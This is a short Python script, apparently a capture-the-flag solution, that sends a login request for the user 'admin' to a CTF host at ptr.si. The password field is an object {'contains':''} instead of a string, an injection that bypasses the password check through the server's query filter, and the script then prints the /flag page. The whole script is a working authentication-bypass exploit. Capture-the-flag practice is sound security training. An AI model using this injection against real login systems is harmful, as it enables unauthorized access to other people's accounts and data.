import requests

url = "https://fixed.ctf.ptr.si"

s = requests.Session()
s.post(url + "/login", json={"username": "admin", "password": {"contains":""}})
print(s.get(url + "/flag").text)
